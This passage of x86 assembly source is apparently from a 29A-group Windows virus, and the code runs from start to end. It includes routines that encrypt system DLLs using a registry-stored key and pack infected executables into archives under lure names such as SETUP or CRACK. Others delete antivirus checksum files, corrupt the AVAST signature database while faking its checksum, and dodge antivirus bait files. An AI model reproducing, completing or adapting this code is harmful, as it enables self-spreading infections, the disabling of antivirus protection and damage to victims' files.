		push	[ebp+__df_handle]	;truncate last 16 bytes
		call	[ebp+ddSetEndOfFile]

	__df_dealloc:
		mov	eax,[ebp+__df_memory]
		call	mdealloc
	__df_fClose:
		mov	ebx,[ebp+__df_handle]
		call	__MyCloseFile

	__df_finish:
		jmp	__ct_finish		;go back to thread

;ÄÄÄ´ function to get cryptography key ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function opens register to get SIMPLE key.
		;
		;Behaviour:
		;  * open register folder "\...\Cryptography\Prizzy/29A"
		;  * read SIMPLE key from "Kiss Of Death"
		;  * get CSP and import SIMPLE key by WinAPI functions
		;  * close register handle, return ImportedKey handle
		;
		;
		;  input:	none
		;  output:	EAX ... imported key (if error, EAX=0)
		;
		__clk_regHan	dd	00000000h	;register handle
		__clk_regFlag	dd	00000000h	;register flags
		__clk_memory	dd	00000000h	;key's memory place
		__clk_sim_len	dd	00000000h	;simple key length
		__clk_provider	dd	00000000h	;CSP provider
		__clk_hKey	dd	00000000h	;imported key
		;
crypt_loadKey:

		; don't call this function once again in actual time
		mov	dword ptr [ebp+crypto_thread],00000000h

		; get delta offset
		call	get_base_ebp

		; has key been loaded ?
		cmp	dword ptr [ebp+crypto_loadKey],00000000h
		jnz	__clk_finish

		xor	eax,eax
		mov	[ebp+__clk_hKey],eax

		; open register folder
		lea	eax,[ebp+__clk_regHan]
		mov	ecx,80000001h		;HKEY_CURRENT_USER
		lea	esi,[ebp+crypto_Register]
		call	__regOpen
		jc	__clk_finish

		; allocate memory for SIMPLE key
		mov	eax,00000100h
		call	malloc
		mov	[ebp+__clk_memory],eax

		; load "Kiss Of Death" item, it is SIMPLE key...
		lea	eax,[ebp+__clk_sim_len]
		mov	dword ptr [eax],00000100h
		push	eax			;address of data buffer size
		push	[ebp+__clk_memory]	;address of data buffer
		mov	eax,00000003h
		lea	ebx,[ebp+__clk_regFlag]
		mov	[ebx],eax
		push	ebx			;REG_BINARY flag
		push	00000000h		;reserved
		lea	eax,[ebp+crypto_RegFlag]
		push	eax			;name of value
		push	[ebp+__clk_regHan]
		call	[ebp+ddRegQueryValueExA]
		or	eax,eax
		jnz	__clk_close_key

		; get CPS provider handle
		push	00000000h		;Flags
		push	00000001h		;PROV_RSA_FULL
		push	00000000h		;provider name
		lea	eax,[ebp+crypto_KeyName]
		push	eax			;my special key
		lea	eax,[ebp+__clk_provider]
		push	eax			;CSP provider
		call	[ebp+ddCryptAcquireContextA]
		or	eax,eax 		;does key exist ?
		jz	__clk_close_key

		; import SIMPLE key
		lea	eax,[ebp+__clk_hKey]
		push	eax			;imported key
		push	00000000h		;flags
		push	00000000h
		push	[ebp+__clk_sim_len]	;length of SIMPLE key
		push	[ebp+__clk_memory]	;SIMPLE key
		push	[ebp+__clk_provider]
		call	[ebp+ddCryptImportKey]

	__clk_close_key:
		push	[ebp+__clk_regHan]
		call	[ebp+ddRegCloseKey]
	__clk_dealloc:
		mov	eax,[ebp+__clk_memory]
		call	mdealloc

		mov	[ebp+crypto_loadKey],'!A92'

	__clk_finish:
		mov	eax,[ebp+__clk_hKey]	;imported key (0=error)
		jmp	__ct_finish		;back to thread

;ÄÄÄ´ do NOT crypted DLL checking - name check and registry ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function checks whether DLL come under to  the avoid
		;table. Heh, what does it mean ? Why some  DLLs can NOT be
		;crypted ? Well, I hook all file  operations from kernel32
		;memory when I'll be actived but till then system 'll open
		;some libraries like KERNEL32.DLL, USER32.DLL ... and then
		;it is my turn to hook, to check. This is that problem.
		;
		__cdc_regHandle dd	00000000h	;register handle
		__cdc_valuesLen dd	00000000h	;MaxValueLen
		__cdc_values	dd	00000000h	;number of values
		__cdc_buffSize	dd	00000000h	;buffer size
		__cdc_nRegistry dd	00000000h	;number of r. classes
		__cdc_memory	dd	00000000h	;namez
		;
		;  input:	EBX ... filename
		;
crypt_DLL_check:

		; save all registers
		pusha

		; check from our table
		lea	esi,[ebp+crypto_unFiles]
		call	validate_name		;is it do NOT crypt file ?
		jc	__cdc_failed

		mov	[ebp+__cdc_nRegistry], \
			(crypto_unReg_E - crypto_unReg) / 4 - 1

		; open registry key
	__cdc_next_class:
		lea	eax,[ebp+__cdc_regHandle]
		mov	ecx,80000002h		;HKEY_LOCAL_MACHINE
		mov	esi,[ebp+__cdc_nRegistry]
		mov	esi,dword ptr [ebp+crypto_unReg+esi*04h]
		add	esi,ebp
		call	__regOpen
		jc	__cdc_finish		;failed ?

		; read number of values
		xor	eax,eax
		push	eax eax 		;LWriteTime, SecDescriptor
		lea	edx,[ebp+__cdc_valuesLen]
		push	edx eax 		;MaxValueLen, MaxValueNameLen
		lea	edx,[ebp+__cdc_values]
		push	edx eax eax eax eax eax eax
		push	[ebp+__cdc_regHandle]
		call	[ebp+ddRegQueryInfoKeyA]
		or	eax,eax 		;failed ?
		jnz	__cdc_regClose

		; allocate memory
		mov	eax,[ebp+__cdc_values]
		imul	eax,[ebp+__cdc_valuesLen]
		mov	[ebp+__cdc_buffSize],eax
		inc	eax			;double zero char
		call	malloc
		mov	[ebp+__cdc_memory],eax

		; read all namez
		mov	esi,[ebp+__cdc_memory]	;pointer to store value name
	__cdc_repeat:
		mov	ecx,00000005h		;five layers
		dec	dword ptr [ebp+__cdc_values] ;next value index
	__cdc_once_again:
		lea	eax,[ebp+__cdc_valuesLen] ;length of value name
		push	eax			;buffer's size
		push	esi			;value name buffer
		push	00000000h		;type of value entry
		push	00000000h		;reserved
		call	$+9
		dd	?			;cbValueName
		push	00000000h		;value name
		push	[ebp+__cdc_values]	;index of value to retrieve
		push	[ebp+__cdc_regHandle]
		call	[ebp+ddRegEnumValueA]	;read index entry
		cmp	eax,000000EAh		;ERROR_MORE_DATA
		jnz	__cdc_check_next
		loop	__cdc_once_again	;try to read that once again
       __cdc_check_next:
		push	[ebp+__cdc_valuesLen]	;number of characters
		push	esi			;filename
		call	[ebp+ddCharUpperBuffA]	;convert to uppercase
		add	esi,[ebp+__cdc_valuesLen] ;next entry in memory buf
		cmp	dword ptr [ebp+__cdc_values],00000000h
		jnz	__cdc_repeat
		mov	byte ptr [esi],01h	;end char status
		mov	esi,[ebp+__cdc_memory]	;avoid table
		call	validate_name		;EBX is filled
		pushf				;ehm :)

		; close register class
		push	[ebp+__cdc_regHandle]
		call	[ebp+ddRegCloseKey]

		; deallocate memory
		mov	eax,[ebp+__cdc_memory]
		call	mdealloc

		; next register key
		popf				;ehm :)
		jc	__cdc_failed
		cmp	dword ptr [ebp+__cdc_nRegistry],00000000h
		jz	__cdc_finish
		dec	dword ptr [ebp+__cdc_nRegistry]
		jmp	__cdc_next_class

		; restore all registers
	__cdc_finish:
		test	al,0F9h 		;hidden STC instruction
	__cdc_failed equ $-1
		popa
		ret

		; close register class
	__cdc_regClose:
		push	[ebp+__cdc_regHandle]
		call	[ebp+ddRegCloseKey]
		jmp	__cdc_finish

;ÄÄÄ´ cryptography thread ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This is true Cryptography thread which can run some common
		;functions, because crypto functions allocated memory ain't
		;shared, so I must use this thread.
		;
		;  input:
		;    crypto_thread ... CT_LOADKEY     - crypt_loadKey func
		;		   ... CT_CRYPTFILE   - crypt_file function
		;		   ... CT_DECRYPTFILE - decrypt_file function
		;
		;  output:
		;    crypto_thread_err ... lastError flag
		;
crypt_thread:

		; save all registers & get delta offset
		pusha
		call	get_base_ebp

		; get thread action
		mov	eax,[ebp+crypto_thread]
		cmp	eax,CT_LOADKEY		;crypt_loadKey
		jz	crypt_loadKey
		cmp	eax,CT_CRYPTFILE	;crypt_file
		jz	crypt_file
		cmp	eax,CT_DECRYPTFILE	;decrypt_file
		jz	decrypt_file
		jmp	__ct_finish_all 	;bad input parameter

		; set (C)arry and EAX
	__ct_finish:
		mov	[ebp+crypto_thread_err],eax

		; restore all registers
	__ct_finish_all:
		push	2			;wait for a while
		call	[ebp+ddSleep]

		popa
		jmp	crypt_thread

;ÄÄÄ´ get FileName of library ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function is  called from "FreeLibrary" function. Be-
		;cause FL parameter is place in memory, I have to  get its
		;filename to crypt that.
		;
		;Behaviour:
		;  * get filename from handle (FreeLibrary parameter)
		;  * check DLL name (might I crypt u ?)
		;  * run FreeLibrary function (file was closed)
		;  * get process where I created "crypto thread"
		;  * crypt file (by thread: CT_CRYPTFILE flag)
		;  * go back (two ways: success OR failed)
		;
crypt_get_library:

		; save all registers
		pusha

		; get FileName of the module
		push	filename_size
		lea	eax,[ebp+filename]
		mov	[ebp+filename_ptr],eax
		push	eax			  ;input parameter for Free-
		push	dword ptr [esp+00000054h] ;Library function
		call	[ebp+ddGetModuleFileNameA]

		; check whether I can crypt that file
		mov	ebx,[ebp+filename_ptr]
		call	crypt_DLL_check

	__final_SoftICE_2:
		nop
		nop
;		 int	 4			 ;final SoftICE breakpoint

		jc	__cgl_finish

		; free library from memory
		popa				;ehm :)
		popf
		popa
		push	dword ptr [esp+00000008h]
		mov	eax,[esp+00000004h]
		call	[eax+1] 		;FreeLibrary function, huh?
		pusha

		; crypt that file
		call	get_base_ebp		;damn bug !
		cmp	[ebp+crypto_thread_err],'!A92'
		jz	__cgl_finish2		;other process ?
		mov	[ebp+crypto_thread],CT_CRYPTFILE
		mov	[ebp+crypto_thread_err],'!A92'
		push	[ebp+crypto_mainProcId] ;active process where I cre-
		push	00000000h		;ated my thread, I cannot
		push	00000001h		;active my thread from other
		call	[ebp+ddOpenProcess]	;process then where was cre-
		push	eax			;ated
	__cgl_cCryptFile:
		push	50			;active crypto thread
		push	dword ptr [esp+00000004h]
		call	[ebp+ddWaitForSingleObject]
		cmp	[ebp+crypto_thread_err],'!A92'
		jz	__cgl_cCryptFile	;crypto thread must crypt DLL
		call	[ebp+ddCloseHandle]

		; restore all registers
	__cgl_finish2:
		popa
		add	esp,00000004h
		ret	4			;go back, my lord !

	__cgl_finish:
		popa
		jmp	__hif_finish

;ÄÄÄ´ common register functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__regOpen:		; open certain register class
			;   input:
			;     EAX ... address of register handle
			;     ECX ... reg (HKEY_CURRENT_USER, HKEY_*, ...)
			;     ESI ... register class
			;   output:
			;     (C)flags
			;     EAX ... is NOT modified
			;

		pusha				;save all registers
		push	eax			;address of register handle
		push	000F003Fh		;flag: KEY_ALL_ACCESS
		push	00000000h		;reserved
		push	esi			;register class
		push	ecx			;reg id
		call	[ebp+ddRegOpenKeyExA]
		or	eax,eax 		;fault ?
		popa				;restore registers
		jnz	__cReg_fault
		test	al,0F9h 		;hidden STC instruction
	__cReg_fault	equ $-1
		ret

;ÄÄÄ´ functions to calculate brute-CRC64 and CRC32 for APIs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function tries to calculate "brute-CRC64" value for
		;certain buffer when the first two valuez won't know. So,
		;I won't generate DWORD because this operation is very
		;difficult for CPU but instead this I'll encode two WORDs.
		;For DLL encrypting i use this method but for PPE-II I'll
		;generate DWORD.
		;
		;  input:    ESI ... source data
		;	     ECX ... defined data in buffer ESI
		;
		;  output:   EAX ... my low  "brute-CRC64" value
		;	     EDX ... my high "brute-CRC64" value
		;
__bruteCRC64:
		push	esi ecx
		add	esi,00000002h		;next WORD
		sub	ecx,00000002h
		call	__bCRC64_calculate
		pop	ecx esi
		push	eax			;save the 1st "CRC64" value
		call	__bCRC64_calculate
		pop	edx
		ret

	__bCRC64_calculate:
		xor	edx,edx 		;clear registers
		xor	ebx,ebx
		xor	eax,eax
	__bCRC64_next_byte:
		lodsb				;load next byte
		xor	dl,al
		xor	bh,dh
		sub	ebx,eax
		mov	al,8
	__bCRC64_next_bit:
		rcl	edx,1			;set (c)arry ?
		jc	__bCRC64_no_changes
		xor	edx,0C1A7F39Ah		;ahhh, special valuez
		xor	ebx,09C3B248Eh
		xor	ebx,edx
       __bCRC64_no_changes:
		dec	al			;next bit ?
		jnz	__bCRC64_next_bit
		dec	ecx
		jnz	__bCRC64_next_byte
		xchg	eax,ebx 		;low value to EAX
		ret

		;---------------------------------------------------------
		;This function wants to get right value which 's been lost
		;Thru "brute-attack" method.
		;
		;  input:    ESI ... input buffer
		;	     ECX ... number of bytes in buffer with l.value
		;	     EAX ... low  generated "brute-CRC64" value
		;	     EDX ... high generated "brute-CRC64" value
		;
		;  output:   EAX ... original value
		;
__get_bruteCRC64:

		xor	ebx,ebx
		mov	[esi],ebx		;clear original value to zero
		push	eax edx 		;save generated "brute-CRC64"
		push	esi ecx 		;save POS and COUNTER
		add	esi,00000002h		;the second value
		sub	ecx,00000002h
	__g_bCRC64_second_word:
		push	esi ecx 		;save POS and COUNTER
		call	__bCRC64_calculate	;check its "brute-CRC64"
		pop	ecx esi
		inc	word ptr [esi]		;increase original value
		cmp	[esp+00000008h],eax	;ahhh, what's now ?
		jnz	__g_bCRC64_second_word
		dec	word ptr [esi]		;decrease original value

		pop	ecx esi 		;start of the 1st value
	__g_bCRC64_first_value:
		push	esi ecx 		;save POS and COUNTER
		call	__bCRC64_calculate	;calculate its "brute-CRC64"
		pop	ecx esi
		inc	word ptr [esi]		;increase original value
		cmp	[esp+4],eax		;ahhh, what's now ?
		jnz	__g_bCRC64_first_value
		dec	word ptr [esi]		;decrease original value
		add	esp,00000008h		;take away CRC64
		ret

		;---------------------------------------------------------
		;This function calculates CRC32 for name of API functions.
		;The code has been stolen from LoRez source, hi mLapse :)
		;
		__mCRC32	equ	0C1A7F39Ah
		__mCRC32_init	equ	09C3B248Eh
		;
__macro_CRC32	macro	string
	    crcReg = __mCRC32_init
	    irpc    _x,<string>
		ctrlByte = '&_x&' xor (crcReg and 0FFh)
		crcReg = crcReg shr 8
		rept 8
		    ctrlByte = (ctrlByte shr 1) xor (__mCRC32 * (ctrlByte and 1))
		endm
		crcReg = crcReg xor ctrlByte
	    endm
	    dd	crcReg
endm

		;---------------------------------------------------------
		;I don't compare API stringz in kernel32 but CRC32.
		;
		;  input:    ESI ... string
		;  output:   EAX ... CRC32
		;
__get_CRC32:
		push	edx
		mov	edx,__mCRC32_init
	__gCRC32_next_byte:
		lodsb
		or	al,al			;end of name ?
		jz	__gCRC32_finish

		xor	dl,al
		mov	al,08h
	__gCRC32_next_bit:
		shr	edx,01h
		jnc	__gCRC32_no_change
		xor	edx,__mCRC32
	__gCRC32_no_change:
		dec	al
		jnz	__gCRC32_next_bit
		jmp	__gCRC32_next_byte
	__gCRC32_finish:
		xchg	eax,edx 		;CRC32 to EAX
		pop	edx
		ret

;ÄÄÄ´ function to add dropper to table ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function is main feature for inside-archive works.
		;
		;What we know:
		;  * this function is called from "infect_file"
		;  * it's certainly *.EXE file
		;  * its filesize is lesser then 30Kb
		;
		;Headlines:
		;  * get empty archive dropper (create ZIP/ARJ's dropper ?)
		;      * if CAB, no packing (stupid structure)
		;  * give me TEMP directory (e.g. \WINDOWS\TEMP)
		;  * create random TEMP file name (e.g. 29A + 0001.TMP, ...)
		;  * get random file name (e.g. SETUP, CRACK, GRATIS, ...)
		;  * copy infected file to TEMP directory under new name
		;  * create compress command
		;      (e.g. C:\ACE.EXE a -ep -m5 C;\TEMP\RUN.EXE C:\TEMP\29A0001.TMP)
		;  * create process and execute that command
		;  * check process' thread whether process has been finished
		;  * delete random file name
		;
		;
		;  input:      EAX ... filesize
		;
		__new_dName	dd	00000000h	;dropper's newName
		;
__add_dropper:

		; save registers
		pusha

		; some free archiver program ?
		mov	ecx,NewArchiveNum
	__ad_searching:
		mov	eax,ecx 		;convert <1..NewArchiveNum>
		dec	eax			;  t o	 <0..NewArchiveNum-1>
		lea	esi,[ebp+NewArchive]
		imul	eax,NewArchiveSize
		add	esi,eax
		push	ecx

		; test whether dropper has been created
		cmp	[esi.dropper],00000000h
		jnz	__ad_next

		; test whether CAB structure is empty
		cmp	ecx,NewArchiveNum
		jnz	__ad_next_archive

		mov	eax,filename_size	;allocate mem for CAB's name
		call	malloc
		mov	[esi.dropper],eax
		mov	edi,eax 		;copy archive name EXE to
		mov	esi,[ebp+filename_ptr]	;my new CAB file name buffer
		mov	ecx,filename_size
		rep	movsb
		jmp	__ad_next

		; test whether archiver program has been found
	__ad_next_archive:
		mov	ebx,esi
		cmp	[ebx.program],00000000h
		jz	__ad_next

		; time to prepare dropper - alloc mem, get temp filename
		mov	eax,filename_size
		call	malloc
		mov	[ebx.dropper],eax

		; get TEMP directory
		push	eax			;outta buffer
		push	filename_size
		call	[ebp+ddGetTempPathA]
		or	eax,eax 		;give me filepath length
		jz	__ad_dealloc

		; generate new filename for dropper
		mov	ecx,eax
		mov	eax,filename_size
		call	malloc
		mov	[ebp+__new_dName],eax

		push	eax
		mov	edi,eax 		;destination place
		mov	esi,[ebx.dropper]
		rep	movsb
		call	generate_name
		pop	edi

		; copy "filename_name" to "edi"
		push	00000000h		;rewrite its
		push	edi			;new filepath and filename
		push	[ebp+filename_ptr]	;actual filename
		call	[ebp+ddCopyFileA]
		or	eax,eax
		jz	__ad_dealloc_name

		; get TEMP file like destination archive name
		mov	edi,[ebx.dropper]	;destination place
		push	edi
		push	00000000h
		lea	eax,[ebp+__ad_TEMP_three_chars]
		push	eax			;the first three chars
		push	edi			;main TEMP directory
		call	[ebp+ddGetTempFileNameA]

		; delete TEMP file like archive name
		push	[ebx+dropper]
		call	[ebp+ddDeleteFileA]

		; get filname's last char from archiver
		mov	edi,[ebx.program]
		xor	al,al
		mov	ecx,-1
		repnz	scasb
		dec	edi

		; get archiver's input parameters
		pop	ecx
		push	ecx

		dec	ecx			;convert to <0..
		imul	ecx,ArchiverCommandRealSize
		lea	esi,[ebp+ArchiverCommand]
		add	esi,ecx
		mov	ecx,ArchiverCommandSize
		rep	movsb			;copy input parameters

		; generate compression method
		lodsb				;number of compression method
		movzx	eax,al
		call	ppe_get_rnd_range
		add	esi,eax
		lodsb				;get compression method char
		stosb				;copy it
		mov	al,20h			;space letter
		stosb

		mov	esi,[ebx.dropper]
		@copysz
		mov	byte ptr [edi-1],20h	;space letter

		mov	esi,[ebp+__new_dName]
		@copysz
		mov	byte ptr [edi-1],00h	;zero letter

		; get some startup information
		lea	eax,[ebp+StartupInfo]
		push	eax
		call	[ebp+ddGetStartupInfoA]

		mov	esi,[ebx.program]
		lea	eax,[ebp+ProcessInformation]
		push	eax
		lea	eax,[ebp+StartupInfo]
		push	eax

		; set window's info
		mov	word ptr [eax.dwFlags], 0001h ;STARTF_USESHOWINDOW
		mov	word ptr [eax.wShowWindow], 0000h ;SW_HIDE
		xor	eax,eax
		push	eax			;CurrentDirectory
		push	eax			;Environment
		push	04000000h or \		;CREATE_PROCESS_ERROR_MODE
			00000200h or \		;CREATE_NEW_PROCESS_GROUP
			00000080h		;HIGH_PRIORITY_CLASS
		push	eax			;InheritHandles: FALSE
		push	eax			;ThreadAttributes
		push	eax			;ProcessAttributes
		push	[ebx.program]		;Command
		push	eax			;Application Name
		call	[ebp+ddCreateProcessA]
		or	eax,eax 		;success ?
		jnz	__wait_to_comp

		; disable this achiver for future use
		mov	eax,[ebx.program]
		call	mdealloc
		mov	[ebx.program],00000000h
		jmp	__ad_dealloc		;dealloc droper as well

		; give time to compressing
	__wait_to_comp:
		push	1*4*1000		;4 seconds
		push	[ebp+ProcessInformation.hThread]
		call	[ebp+ddWaitForSingleObject]

		; shut down that process
		push	00000000h		;error-code
		push	[ebp+ProcessInformation.hProcess]
		call	[ebp+ddTerminateProcess]

		push	[ebp+__new_dName]	;delete copied file
		call	[ebp+ddDeleteFileA]

	__ad_dealloc_name:
		mov	eax,[ebp+__new_dName]	;dealloc dropper's new name
		call	mdealloc

	__ad_next:
		pop	ecx
		dec	ecx
		jnz	__ad_searching
		popa
		ret

	__ad_dealloc:
		mov	eax,[ebx.dropper]
		call	mdealloc
		mov	[ebx.dropper],00000000h
		jmp	__ad_next

	__ad_TEMP_three_chars:			;greeting to all from this
		db	'29A',0 		;excelent group (family)

;ÄÄÄ´ function to delete AV files ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function has been called from Hyper Infection - API.
		;So, If any AV checksum file has been found, I will delete
		;its.
		;
		;  input:    EDX ... file name
kill_av:

		push	edx
		call	[ebp+ddDeleteFileA]
		ret

;ÄÄÄ´ function to change AVAST's viruses database ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function modify/truncate AVAST's viruses database.
		;If you want to read tutorial about this method, download
		;it from my web: http://prizzy.cjb.net
		;
		;  input:    filename_ptr ... is filled
		;
		__ka_handle	dd	00000000h	;database's handle
		__ka_memory	dd	00000000h	;database's body
		__ka_new_size	dd	00000000h	;database's new size
		__ka_checksum	dw	0000h		;database's new chck
		;

kill_avast:

		; open AVAST's viruses database
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__ka_finish
		mov	[ebp+__ka_handle],eax

		; generate new database's file size
		mov	eax,50000		;hmmm, + <0,50Kb)
		call	ppe_get_rnd_range
		add	eax,AVAST_memSize
		mov	[ebp+__ka_new_size],eax
		call	malloc
		mov	[ebp+__ka_memory],eax

		; read signature
		mov	edx,[ebp+__ka_memory]
		mov	ecx,00000004h		;four bytes, please
		xor	esi,esi
		mov	ebx,[ebp+__ka_handle]
		call	__MyReadFile
		jc	__ka_dealloc

		; check signature
		mov	eax,[ebp+__ka_memory]
		movzx	eax,word ptr [eax+00000002h]
		cmp	eax,000000F4h
		ja	__ka_dealloc

		; read new size
		mov	edx,[ebp+__ka_memory]
		mov	ecx,[ebp+__ka_new_size]
		mov	esi,00000002h
		mov	ebx,[ebp+__ka_handle]
		call	__MyReadFile
		jc	__ka_dealloc

		; calculate new checksum :)
		xor	di,di			;clear these regz
		xor	dx,dx
		xor	bx,bx
		xor	ax,ax

		mov	esi,[ebp+__ka_memory]	;place in memory
		mov	ecx,[ebp+__ka_new_size] ;really readed bytes
		sub	ecx,00000002h		;sub chacksum word

	__ka_decode_body:
		lodsb
		add	di,ax
		xor	dx,ax
		xor	bx,ax
		ror	bx,01h
		mov	ah,al
		loop	__ka_decode_body

		; and now, I must do the final test
		mov	ax,di
		xor	ax,dx
		xor	ax,bx			;AX=new checksum !!
		mov	[ebp+__ka_checksum],ax

		; write new checksum
		lea	edx,[ebp+__ka_checksum]
		mov	ecx,00000002h
		xor	esi,esi
		mov	ebx,[ebp+__ka_handle]
		call	__MyWriteFile
		jc	__ka_dealloc

		; truncate database :)
		push	00000000h
		push	00000000h
		push	[ebp+__ka_new_size]
		push	[ebp+__ka_handle]
		call	[ebp+ddSetFilePointer]

		push	[ebp+__ka_handle]
		call	[ebp+ddSetEndOfFile]

	__ka_dealloc:
		mov	eax,[ebp+__ka_memory]
		call	mdealloc
		mov	ebx,[ebp+__ka_handle]
		call	__MyCloseFile
	__ka_finish:
		ret

;ÄÄÄ´ may I infect that file ? ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function checks whether file is enabled to infect.
		;
		;  input:	EBX ... filename
		;		ESI ... pointer to an avoid table
		;
validate_name:

		; save all registers
		pusha
		lea	eax,[ebp+__va_check_file]
		push	eax
		mov	edi,ebx

		; get last '\' char
	__va_get_filename:
		push	edi
		call	[ebp+ddlstrlen]
		mov	ecx,eax
		add	edi,ecx
	__va_next_char:
		dec	edi
		cmp	byte ptr [edi],'\'
		jz	__va_found
		dec	ecx
		jnz	__va_next_char
		dec	edi
	__va_found:
		inc	edi
		sub	eax,ecx
		ret

	__va_check_file:
		push	esi
		call	[ebp+ddlstrlen]
		mov	ecx,eax
		push	esi edi
		rep	cmpsb
		pop	edi esi
		jz	__va_file_invalid
		add	esi, eax		;go to the next file
		inc	esi			; + zero char
		cmp	byte ptr [esi],01h	;end of table ?
		jnz	__va_check_file

		; restore all registers
		test	al,0F9h 		;hidden STC instruction
	__va_file_invalid	equ $-1
		popa
		ret

;ÄÄÄ´ anti-bait: do not infect AV files ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;Baits are do-nothing programs used by AVers to spread.
		;Familiarly AVers using these filenames:
		;     00000001.EXE, 00000002.EXE, 00000003.EXE etc.
		;or
		;     AAAAAAAA.EXE, AAAAAAAB.EXE, AAAAAAAC.EXE etc.
		;
		;This function checks if filename certains any triple chars
		;in sequence. It is typical anti-bait.
		;
		;  input:	filename_ptr	... is filled
		;
fuck_av_files:

		; save all registers
		pusha

		; get filename
		call	__va_get_filename	;EAX = filename length

		; check triple chars (= anti-bait)
		xor	eax,eax 		;AH=last char, AL=act. char
		xor	ebx,ebx 		;BL=how many chars
	__faf_repeat:
		mov	al,[edi]
		cmp	ah,al			;last char == actual char ?
		jz	__faf_same_char
		mov	ah,al
		xor	bl,bl
		jmp	__faf_next_char
	__faf_same_char:
		inc	bl
		cmp	bl,02h			;triple char ?
		jz	__faf_failed
	__faf_next_char:
		inc	edi
		cmp	byte ptr [edi],'.'
		jnz	__faf_repeat

		test	al,0F9h 		;hidden STC instruction
	__faf_failed	equ $-1
		popa
		ret

;ÄÄÄ´ function to check if file has been infected ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function check whether number in EAX is divided by
		;special number 117 which the autor has selected for this
		;virus. And 'cause every dividing is possible count through
		;natural logarithm, so I use this math method :).
		;
		;    in classic math:
		;	    " if ((EAX mod 117)==0) file_is_not_infected "
		;    in ln	math:
		;	    " if ((modf(exp(ln(EAX)-ln(117)),&integer)==0)
		;		  file_not_infected "
		;
		;Well, "a/b == e^(ln(a) - ln(b))"
		;      "a*b == e^(ln(a) + ln(b))" etc.
		;
		;      "exp(x) == 2^(x * log2ofE)" etc.
		;
		;Easy to understand :)
		;
__check_infected:

		push	ecx
		mov	dword ptr [ebp+source_value ],eax
		mov	dword ptr [ebp+divided_value],117

		fsave	[ebp+copro_nl_buffer]	;save all regz & flagz
		fninit				;inicialize co-processor
		fldln2				;give me "e^fldln2==2"
		fild	qword ptr [ebp+source_value] ;input number
		fyl2x				;calculate natural logarithm
		fldln2
		fild	qword ptr [ebp+divided_value]
		fyl2x				;calculate 2nd nat logarithm
		fsubp				;ln(EAX) - ln(117)

		fldl2e				;give me log2ofE == 2^
		fmulp
		fabs				;absolute number
		fld1
		fld

		fstcw	[ebp+exp_truncate]	;change rounding
		fstcw	[ebp+exp_default]
		fscale				;2^(trunc ST(1)) + ST(0)
		or	[ebp+exp_truncate],0Fh	;specify truncation mode
		fldcw	[ebp+exp_truncate]	;new mode
		frndint
		and	[ebp+exp_default+1],0f3h;default back to round-nearest
		fldcw	[ebp+exp_default]	;default mode

		fist	[ebp+exp_further]	;save calculing value
		fxch
		fchs				;negative
		fxch
		fscale
		fstp				;fscale did not adjust stack
		fsubp				;now is "0 <= st(0) < 0.5"

		f2xm1				;calculate 2^st(0)
		fld1
		faddp

		shr	word ptr [ebp+exp_further],0001h
		jnb	__no_sqrt2

		fld	tbyte ptr [ebp+sqrt2]	;use sqrt(2) to calculate
		fmulp				;the 2nd part

	__no_sqrt2:
		fild	word ptr [ebp+exp_further]
		fxch
		fscale				;fscale doesn't adjust stack
		fstp

		fldcw	[ebp+exp_truncate]	;set truncate mode
		fld	st(0)			;st(0)=st(1)
		frndint 			;truncate number
		fsubp				;give me only decimal places
		fild	qword ptr [ebp+rounded_value] ;rounding
		fmulp				;multiply by 10^x
		frndint
		fistp	dword ptr [ebp+decimal_places]
		fldcw	[ebp+exp_default]
		frstor	[ebp+copro_nl_buffer]	;restore all regz & flagz

		cmp	dword ptr [ebp+decimal_places],00000000h
		jnz	$+3
		test	al,0F9h 		;hidden STC instruction
		pop	ecx
		ret

sqrt2		dt	3FFFB504F333F9DE6485r	;copro sqrt(2) format
source_value	dq	0000000000h
divided_value	dq	0000000000h
rounded_value	dq	1000000000

;ÄÄÄ´ common file operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__MyOpenFile:					;opens EDX file
		pusha				;save all registers
		xor	eax,eax
		push	eax
		push	FILE_ATTRIBUTE_NORMAL
		push	OPEN_EXISTING
		push	eax
		push	eax
		push	GENERIC_READ OR GENERIC_WRITE
		push	edx			;file name
		call	[ebp+ddCreateFileA]
		mov	[esp].access_eax,eax	;handle - take away
		popa
		cmp	eax,-1			;success ?
		jz	$+3			;jump if STC, if not CLC :)
		test	al,0F9h 		;hidden STC instruction
		ret

__MyReadFile:		; read some bytes (ECX) from certain filepos (ESI)
			; to buffer (EDX) by handle (EBX)
			;   input:
